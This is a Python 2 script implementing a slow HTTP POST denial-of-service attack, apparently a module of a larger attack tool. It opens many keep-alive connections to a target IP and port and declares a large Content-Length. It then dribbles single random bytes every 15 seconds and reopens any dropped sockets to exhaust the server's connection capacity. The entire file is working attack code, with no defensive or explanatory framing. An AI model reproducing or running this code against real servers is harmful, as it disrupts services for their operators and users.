#python command.py
#http-post -port 80 -ip 192.168.0.74 -n 10 -start
#!/usr/bin/python
import logging
import random
import socket
import sys
import time
from struct import *

contentLenght = 900
verbose = True
socketsList = []
userAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\
            (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"


if verbose:
    logging.basicConfig(format="[%(asctime)s] %(message)s",\
            datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
else:
    logging.basicConfig(format="[%(asctime)s] %(message)s",\
            datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)


def init_socket(ipDest, portDest):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    
    s.connect((ipDest, portDest))

    s.send("POST /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)))
    s.send("Host: {}:{}\r\n".format(ipDest, portDest))
    s.send("Connection: keep-alive\r\n")
    s.send("Keep-Alive: timeout=600\r\n")
    s.send("Content-Length: {}\r\n".format(contentLenght))
    s.send("Content-Type: application/json\r\n")
    s.send("User-Agent: {}\r\n".format(userAgent))
    s.send("Accept-language: en-US,en,q=0.5\r\n")
    s.send("\r\n")

    return s

def httpPost(ID, portDest, ipDest, event, queue, n):
    
    nSockets = int(n)
    print"[HTTP-POST] Attacking %s with %s sockets.\n" %(ipDest, n)
#    logging.info("Creating sockets...")


    for _ in range(nSockets):
        try:
            print "[HTTP-POST] Creating socket %s\n" %(_)
            s = init_socket(ipDest, int(portDest))
        except socket.error, exc:
            break
        socketsList.append(s)

    while event.is_set():
        #print "[HTTP-POST] Sending keep-alive headers... \
        #       Socket count: %s\n" %(len(socketsList))

        for s in list(socketsList):
            try:
                s.send(pack('!B', random.getrandbits(8)))
            except socket.error, exc:
                print"Erro: %s" %(exc)
                socketsList.remove(s)

        for _ in range(nSockets - len(socketsList)):
            print "[HTTP-POST] Recreating socket...\
                Socket count: %s\n" %(len(socketsList))

            try:
                s = init_socket(ipDest, int(portDest))
                if s:
                    socketsList.append(s)
            except socket.error:
                break
        event.wait(timeout=15)

    for _ in range(nSockets):
        print "[HTTP-POST] Closing socket %s\n" %(_)

    queue.task_done()
